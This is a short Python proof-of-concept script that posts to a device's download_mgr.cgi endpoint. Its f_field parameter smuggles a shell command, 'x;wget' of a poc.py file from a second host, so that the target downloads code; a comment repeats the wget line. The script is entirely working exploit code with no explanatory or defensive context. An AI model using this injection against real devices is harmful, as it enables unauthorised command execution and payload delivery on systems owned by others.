import requests

url = "http://192.168.31.10:80/cgi-bin/download_mgr.cgi"

headers = {
}

data = {'f_field': 'x;wget http://192.168.31.166:8876/poc.py;', 'f_history': '0', 'cmd': 'RSS_Get_Channel_Info'}

# wget http://192.168.31.166:8876/poc.py

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

